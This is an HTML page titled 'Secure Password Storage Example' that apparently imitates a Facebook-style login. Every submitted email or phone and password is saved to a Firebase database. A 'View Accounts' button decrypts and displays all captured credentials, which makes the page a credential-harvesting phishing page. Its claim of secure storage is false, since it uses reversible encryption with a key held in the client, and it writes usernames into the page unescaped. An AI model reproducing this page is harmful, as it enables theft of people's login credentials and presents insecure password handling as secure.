<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Password Storage Example</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <link rel="stylesheet" href="face.css">

</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <h2>Login</h2>
            <form id="login-form">
                <input type="text" id="username" name="username" placeholder="Email or phone number" required>
                <input type="password" id="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
            <button id="view-accounts">View Accounts</button>
            <div id="account-info"></div>
        </div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "YOUR_API_KEY",
            authDomain: "YOUR_AUTH_DOMAIN",
            projectId: "YOUR_PROJECT_ID",
            storageBucket: "YOUR_STORAGE_BUCKET",
            messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
            appId: "YOUR_APP_ID"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        const encryptionKey = "YOUR_ENCRYPTION_KEY";

        function encryptPassword(password) {
            return CryptoJS.AES.encrypt(password, encryptionKey).toString();
        }

        function decryptPassword(encryptedPassword) {
            const bytes = CryptoJS.AES.decrypt(encryptedPassword, encryptionKey);
            return bytes.toString(CryptoJS.enc.Utf8);
        }

        async function saveAccount(username, password) {
            const encryptedPassword = encryptPassword(password);
            const userRef = db.collection("users").doc(username);
            await userRef.set({
                username: username,
                password: encryptedPassword
            });
        }

        async function checkAccount(username, password) {
            const userRef = db.collection("users").doc(username);
            const doc = await userRef.get();
            if (doc.exists) {
                const decryptedPassword = decryptPassword(doc.data().password);
                if (decryptedPassword === password) {
                    alert("Login successful!");
                } else {
                    alert("Invalid username or password");
                }
            } else {
                alert("Invalid username or password");
            }
        }

        // Hàm xem tất cả tài khoản và mật khẩu
        async function viewAccounts() {
            const userRef = db.collection("users");
            const snapshot = await userRef.get();
            let accountsHtml = "<h3>User Accounts:</h3>";
            if (snapshot.empty) {
                accountsHtml += "<p>No accounts found.</p>";
            } else {
                snapshot.forEach(doc => {
                    const data = doc.data();
                    const decryptedPassword = decryptPassword(data.password);
                    accountsHtml += `<p>Username: ${data.username}, Password: ${decryptedPassword}</p>`;
                });
            }
            document.getElementById("account-info").innerHTML = accountsHtml;
        }

        document.getElementById("login-form").addEventListener("submit", async function(event) {
            event.preventDefault();
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;
            await saveAccount(username, password);
            await checkAccount(username, password);
        });

        document.getElementById("view-accounts").addEventListener("click", viewAccounts);
    </script>
</body>
</html>
